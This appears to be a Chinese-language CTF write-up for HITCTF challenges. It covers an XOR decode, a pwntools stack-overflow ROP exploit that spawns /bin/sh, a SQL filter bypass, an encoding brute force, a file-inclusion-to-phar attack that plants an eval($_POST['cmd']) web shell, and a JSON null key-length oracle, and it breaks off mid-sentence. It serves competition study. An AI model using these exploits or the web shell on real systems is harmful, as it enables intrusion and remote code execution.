    <content type="html"><![CDATA[<h3 id="easy-xor-apk"><a href="#easy-xor-apk" class="headerlink" title="easy_xor.apk"></a>easy_xor.apk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'kmqgwg]Tm3=NE_/4ouKJW@WE^'</span></span><br><span class="line">b=<span class="string">'#$%$#!&amp;#^_^~(:p@_*#######'</span></span><br><span class="line">c = [chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><p>简单xor即可：HITCTF{w3lc0me_t0_hitctf}</p><h3 id="stackflow"><a href="#stackflow" class="headerlink" title="stackflow"></a>stackflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单栈溢出后ROP，程序自带可以<code>cat flag</code>的函数，其实也可以用<code>system(&#39;/bin/sh\0&#39;)</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  command = <span class="string">"cat flag"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xC0FFEE</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意<code>bss</code>中有<code>stdout</code>参数，不能直接写<code>bss+4</code>的位置，<code>fflush(stdout)</code>会报错<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">target = <span class="string">'stackoverflow'</span>  </span><br><span class="line">remote_addr = <span class="string">'pwn.sniperoj.cn'</span></span><br><span class="line">remote_port = <span class="number">30006</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./'</span>+target)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">offset= <span class="number">44</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x804A04c</span>  <span class="comment">#bss+12</span></span><br><span class="line"><span class="comment">#payload = offset*'a' + p32(flag_addr) + p32(0) +p32(0xdeadbeef)+p32(0xc0ffee)</span></span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(read_addr) + p32(vuln_addr) +p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">'/bin/sh\0'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(sys) + p32(vuln_addr)+p32(bss)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    flag = file.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        flag = base64.b64encode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = base64.b32encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(flag)</span><br></pre></td></tr></table></figure><p>20次随机base64或base32编码，手工一下就行了</p><h3 id="单表替换"><a href="#单表替换" class="headerlink" title="单表替换"></a>单表替换</h3><p>手工替换即可，注意俄文也有分大小写的，原文是Gone with the wind</p><h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br></pre></td></tr></table></figure><p>弱类型绕过<code>passwd</code>的判断，用<code>with rollup</code>；由于过滤了<code>limit</code>，可以用<code>having passwd is null</code>解决。</p><h3 id="学习资料的密码"><a href="#学习资料的密码" class="headerlink" title="学习资料的密码"></a>学习资料的密码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Give me your key:"</span>);</span><br><span class="line">v7 = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x32</span>u);</span><br><span class="line">myRead(v7);</span><br><span class="line">v6 = basen(v7);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, &amp;v4) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've got my base :)"</span>);</span><br></pre></td></tr></table></figure><p>题目提供了加密后的flag，程序对输入进行运算后与加密内容比较，看看加密算法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v19 - v19 % <span class="number">3</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v22;</span><br><span class="line">    v2 = v22 + <span class="number">1</span>;</span><br><span class="line">    v20[v1] = chart[(a1[i] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v3 = v2++;</span><br><span class="line">    v20[v3] = chart[(a1[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v4 = v2++;</span><br><span class="line">    v20[v4] = chart[<span class="number">2</span> * a1[i] &amp; <span class="number">6</span> | (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>];</span><br><span class="line">    v5 = v2++;</span><br><span class="line">    v20[v5] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v6 = v2++;</span><br><span class="line">    v20[v6] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v7 = v2++;</span><br><span class="line">    v20[v7] = chart[<span class="number">4</span> * a1[i + <span class="number">1</span>] &amp; <span class="number">4</span> | (a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>];</span><br><span class="line">    v20[v2] = chart[(a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v8 = v2 + <span class="number">1</span>;</span><br><span class="line">    v22 = v2 + <span class="number">2</span>;</span><br><span class="line">    v20[v8] = chart[a1[i + <span class="number">2</span>] &amp; <span class="number">7</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>重点在这段代码，算法是将3为明文转换成8位，多出来的位运算后面还有，但不重要。密文是67位，67%8=3，重点解决前面22位OK了。算法不难，可以直接进行每3位爆破，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="string">'llW00ml0lWeml3Weceec3m03c0e!0mc!cW0cl3ecc3lm!0eccllecmmWcmWcmWm3c!l'</span></span><br><span class="line">chart = <span class="string">'W3lc0me!'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">5</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">2</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">2</span> * ord(s[<span class="number">0</span>]) &amp; <span class="number">6</span> | (ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">4</span> * ord(s[<span class="number">1</span>]) &amp; <span class="number">4</span> | (ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[ord(s[<span class="number">2</span>]) &amp; <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                t = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> f(t) == a1[n*<span class="number">8</span>:n*<span class="number">8</span>+<span class="number">8</span>]:</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    flag += foo(_)</span><br><span class="line">    <span class="keyword">print</span> flag   <span class="comment">#HITCTF&#123;3asy_b4se_3ight:)&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>主页存在文件包含，可查看源代码<br><code>http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login</code></p><p>login.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;CTF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">  ç»éè§£éæ´å¤åè½</span><br><span class="line">  &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    ç¨æ·å : &lt;input name=<span class="string">"username"</span> placeholder=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    å¯ç  : &lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"ç»é"</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">          $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">          $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">          file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>包含config.php有admin的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$admin_hash = &quot;df650edd89a1abfb417124133daf4c103e6d2e97&quot;;</span><br></pre></td></tr></table></figure></p><p>思路：你用输入的username和password，写入log，然后文件包含，本题中间用了<code>=&gt;</code>做连接，预期解法用phar。需要修改php.ini的配置，去掉<code>phar.readonly</code>注释并改成off</p><p>1.phar生成时，php文件带有<code>=&gt;</code>关键字，建一个c文件夹，里面放一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'c.phar'</span>, <span class="number">0</span>, <span class="string">'c.phar'</span>);</span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="string">'./c'</span>);</span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'e.php'</span>, <span class="string">' =&gt; .php'</span>));</span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">s = <span class="string">" =&gt; "</span></span><br><span class="line">host = <span class="string">"120.24.215.80"</span></span><br><span class="line">port = <span class="number">10012</span></span><br><span class="line">url = <span class="string">"http://%s:%d/login.php?debug=hitctf"</span> % (host, port)</span><br><span class="line">content = open(<span class="string">'c.phar'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">username = content[:<span class="number">15</span>]</span><br><span class="line">password = content[<span class="number">15</span> + len(s):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] User : [%s]"</span> % (urllib.quote(username))</span><br><span class="line">data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">print</span> response.content</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] http://%s:%d/?page=phar://log/%s.log/c&amp;c=phpinfo();"</span> % (host, port, urllib.quote(username))</span><br></pre></td></tr></table></figure></p><p>2.直接传phar，由于开头加了东西，需要修改phar包的校验值。(<a href="http://php.net/manual/en/phar.fileformat.signature.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.signature.php</a>)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'shell.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$phar[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php eval($_POST[\'cmd\']);?&gt;'</span> ;</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>留意最后28个字节，最后4字节是固定标识，倒数4-8字节是hash类型，这里是0x02代表sha1，由于开头会增加字节，删掉最后28字节，加上增加的开头，重新计算sha1。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSha1</span><span class="params">(filename)</span>:</span> </span><br><span class="line">    sha1Obj = sha1()</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        sha1Obj.update(f.read())</span><br><span class="line">    <span class="keyword">return</span> sha1Obj.hexdigest()</span><br></pre></td></tr></table></figure></p><h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>可参考：<a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a></p><p><a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc" target="_blank" rel="noopener">http://123.206.83.157:8000/<strong>pycache</strong>/app.cpython-35.pyc</a>反编译得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    key = <span class="keyword">None</span>[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):  <span class="comment">#注意这里，可以通过这里报错来确定key长度</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="keyword">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><p>对于None类型，ord(None)会崩溃掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; key = [None,None]</span><br><span class="line">&gt;&gt;&gt; ord(key[1])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: ord() expected string of length 1, but NoneType found</span><br></pre></td></tr></table></figure></p><p>JSON里面null会在python里面转换成none。</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（15个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server 